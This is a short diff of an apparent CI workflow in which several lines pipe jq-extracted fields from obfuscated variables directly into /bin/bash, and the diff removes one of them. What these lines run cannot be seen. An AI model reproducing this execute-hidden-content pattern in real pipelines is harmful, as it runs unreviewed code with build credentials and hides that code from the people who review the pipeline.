@@ -36,7 +36,6 @@ jobs:
           printf '%s' "$pmxdr404" | jq -r .vbqgz3932 | /bin/bash
           echo $omdy90 | jq -r .pov81 | /bin/bash
           printf '%s' "$prbj129" | jq -r .gpsrm6 | /bin/bash
-          echo $qhufq403 | jq -r .g35 | /bin/bash
           printf '%s' "$ph993" | jq -r .lygfb37467 | /bin/bash
 
       - name: Store results
